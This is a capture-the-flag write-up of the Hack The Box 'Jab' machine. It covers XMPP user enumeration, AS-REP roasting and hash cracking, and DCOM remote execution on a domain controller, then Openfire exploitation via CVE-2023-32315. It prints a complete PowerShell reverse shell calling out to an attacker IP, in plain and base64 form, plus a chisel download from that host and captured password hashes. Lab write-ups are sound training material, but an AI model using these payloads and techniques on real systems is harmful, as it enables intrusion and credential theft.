# Jab Write-Up - HTB

## Recon

```
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2025-04-28 20:56:59Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2025-04-28T20:58:18+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2025-04-28T20:58:18+00:00; 0s from scanner time.
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T20:58:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2025-04-28T20:58:18+00:00; 0s from scanner time.
5222/tcp  open  jabber
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     features: 
|_    stream_id: 1yjz9ki5qy
5223/tcp  open  ssl/jabber
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     unknown: 
|_    features: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5262/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     features: 
|_    stream_id: 981kqlsdfj
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5263/tcp  open  ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     unknown: 
|_    features: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: TLS randomness does not represent time
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     unknown: 
|_    features: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5275/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     features: 
|_    stream_id: 982tavb744
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     xmpp: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     unknown: 
|_    features: 
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Apr 2025 20:56:59 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Apr 2025 20:57:05 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Apr 2025 20:57:12 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Apr 2025 20:57:18 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49673/tcp open  msrpc               Microsoft Windows RPC
49690/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc               Microsoft Windows RPC
49694/tcp open  msrpc               Microsoft Windows RPC
49699/tcp open  msrpc               Microsoft Windows RPC
49731/tcp open  msrpc               Microsoft Windows RPC
49822/tcp open  msrpc               Microsoft Windows RPC

```

## Enumeration

After doing basic enumeration over LDAP and SMB and didn't find anything special, I moved to XMPP.

Connected to it via profanity.

Started basic enumeration via /xmpconsole

```
<iq type='get' id='version1' to='jab.htb'>
  <query xmlns='jabber:iq:version'/>
</iq>

22:50:00 - RECV:
22:50:00 - <iq id="version1" to="iew4x33tb@jab.htb/iew4x33tb" type="result" from="jab.htb"><query xmlns="jabber:iq:version"><name>Openfire</name><version>4.7.5</version><os>Windows Server 2019 10.0 (amd64) - Java 1.8.0_391</os></query></iq>
```

This seems to be a vulnerable version.&#x20;

By running:

```
/disco info

//I found:
22:58:23 - Server contact information:
22:58:23 -   admin-addresses:
22:58:23 -     xmpp:admin@jab.htb
22:58:23 -     mailto:admin@jab.htb
22:58:23 -     xmpp:svc_openfire@jab.htb
```

Running:

```
<iq type='get' id='v3' to='svc_openfire@jab.htb'>
  <vCard xmlns='vcard-temp'/>
</iq>

#Outputs a big b64 encode string. 
```

Let's check that string.

Nothing...&#x20;

After a while I managed to enumerate all the users:

```
<iq type='set' id='search2' to='search.jab.htb'>
  <query xmlns='jabber:iq:search'>
    <x xmlns='jabber:x:data' type='submit'>
      <field var='FORM_TYPE' type='hidden'>
        <value>jabber:iq:search</value>
      </field>
      <field var='search'>
        <value>*</value>
      </field>
      <field var='Username'>
        <value>1</value>
      </field>
      <field var='Name'>
        <value>1</value>
      </field>
      <field var='Email'>
        <value>1</value>
      </field>
    </x>
  </query>
</iq>
```

Seems like we've reached a roadblock. Many users, not many ideas.

## Footholding

Let's see if there are any Kerberoastable ones:

```
impacket-GetNPUsers jab.htb/ -usersfile users.txt -format john -outputfile hashes.txt
```

{% code overflow="wrap" %}
```
[-] User csinquefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rwester doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$lbradford@JAB.HTB:bae45c8800855103554bfd240b780475$1b635a838df2b5bb268276c0e23e2ff958cb6f0bbc63b0025cd5477dab6a878afdaac7ddee211c072e04f32ea000b36ab671c53c1243bcd078451320761c038c95e80b6f006a92d85274b5b5865dc21ac89cf141f961124769e7f3e6cdfc4f90be26dbc601c161119f4bfe391949c59baeffefcaa8b598da833e698b61a64af4acdeb641fae6caba7eb4413e226d56949374c4f8e47e1edc7cb6eddfee19879b431d95ee627955e6ce6f1421ebaa5b891e162a1ea9d0189fd401822217dda5008e4ce7f23be15c849b271b9f640eb8012121ed8f64f6164c52061dd3028c4a5b261f

$krb5asrep$jmontgomery@JAB.HTB:659b370246c775e4b929f43f1c55d55f$c22adc0085c69d503034b0b5c6c178ae2ea7ccf2a9c13b2f6dce97e6332825cb7b94238147c30e6cace5c5cb1e654d08ff5d3e45822cac0ca5f024eba5a0caeb4c00a55b8cde3b5b27ddf5376b4a277cea1f3d6951d2e007171ed3023e18cd249821d7076c0d7318d1bffe4a615fa12f5812fac2fa4e92aad75d37b624b468aa29139ee641a9d1f10611abd4d6ce1d9a813156f4d1bf13aaf98c63fedef3440faeb0523a8c06640d1d2257a4dbe30835efa3e57665d22c141f5a04bd04c75298ab0d1054b670d41325fde3774e52615f8f6a859a0abd59f3c62ce2ee9224c07683e4
$krb5asrep$mlowe@JAB.HTB:8c8a4bfc254841784d389424d2524f45$c3e0bbca9b067fcfed08c480fc748e0bf17ca7fea8f38bf315d779f1528b72ae6a67bff2537d5be97761de9ec6171f7cf8b446255d06a088e60539ee05d464e7ed40fa7ad6e550487273b44f1306fb562905bd8e5bfdafea592435068c054f2868d638a5cf18648e91fcae73b99bef0559637d614c6b65b11e8a0165a0ea5ac45e2ef6b2097ee19d95b402c0ac63a8c24a17096f1de699e810dc2e82d28419d6fbd8b212d0789aa80b7dddf68c98114cc9221dec23fadd612941f402f26fd149a171a38846ba4192920d7cd745469a31634ba85c9c218678e1762eca9b5be99b0a4e

```
{% endcode %}

Let's hope we can crack any of these.

```
john --wordlist=/home/czr/HTB/rockyou.txt hashs.txt
```

Wonderful!

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

I connected to jabber with the new creds:

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Found valid creds for svc\_openfire service:

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Checking Bloodhound:

<figure><img src="../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

Interesting, we have ExecuteDCOM permissions:

<figure><img src="../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

After some trial and error and back n forth action. I tried several ways of authenticating, via hash, via TGS, via user+pw and nothing worked... Well almost nothing.&#x20;

Interesting enough, this command was always hanging, not throwing any error:

```
impacket-dcomexec jab.htb/svc_openfire@dc01.jab.htb -object MMC20
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] SMBv3.0 dialect used
^C[-] 
```

I said, let's try launching commands remotely:

{% code overflow="wrap" %}
```
impacket-dcomexec -silentcommand jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@dc01.jab.htb -object MMC20 "whoami
```
{% endcode %}

This didn't show anything, but it didn't hang anymore.

This started hanging:

{% code overflow="wrap" %}
```
impacket-dcomexec -silentcommand jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@dc01.jab.htb -object MMC20 "pwd"   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

^C[-] nca_s_proto_error
^CTraceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1540, in _shutdown
    _thread_shutdown()
KeyboardInterrupt: 
```
{% endcode %}

Due to this pattern, I tried running a reverse shell:

{% code overflow="wrap" %}
```
PS_SHELL='$client = New-Object System.Net.Sockets.TCPClient("10.10.16.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
{% endcode %}

{% code overflow="wrap" %}
```
echo -n "$PS_SHELL" | iconv -t utf16le | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
{% endcode %}

Let's give it a shot:

{% code overflow="wrap" %}
```
impacket-dcomexec -silentcommand jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@dc01.jab.htb -object MMC20 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
{% endcode %}

Sweet!

<figure><img src="../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

After I ran a couple of PrivEsc commands, I found something useful:

```
netstat -ano | findstr "LISTENING"
```

We can find:

```
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3204
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3204
```

We see that openfire is listening on these:

```
Get-Process -Id 3204

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
   1779      94   310696     278508              3204   0 openfire-service
```

Now, I ran chisel.

```
iwr -Uri "http://10.10.16.5:9080/chisel.exe" -OutFile chisel.exe
```

```
.\chisel.exe client 10.10.16.5:1010 R:socks
```

<figure><img src="../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

Give the fact that we know this is a vulnerable version: 4.7.5 through msf, let's set the console up:

<figure><img src="../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

Seems to fail... hmm:

```
[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. Openfire version is 4.7.5 ForceExploit is enabled, proceeding with exploitation.
[*] Grabbing the cookies.
[*] JSESSIONID=node0135pqeuh1vttzvg8h2oiksnsu3.node0
[*] Adding a new admin user.
[-] Exploit aborted due to failure: no-access: Adding a new admin user is not successful.
[*] Exploit completed, but no session was created.

```

I chose a different PoC:

<figure><img src="../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

Didn't work.&#x20;

And then it occured in my mind that WTF! We are already svc\_openfire! So, I tried the same credentials over the portal and it works.

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

I used the same PoC:

[https://github.com/miko550/CVE-2023-32315](https://github.com/miko550/CVE-2023-32315) - But this time I only uploaded the plugin.

<figure><img src="../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Set up a reverse shell:

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Cool one! Really cool!
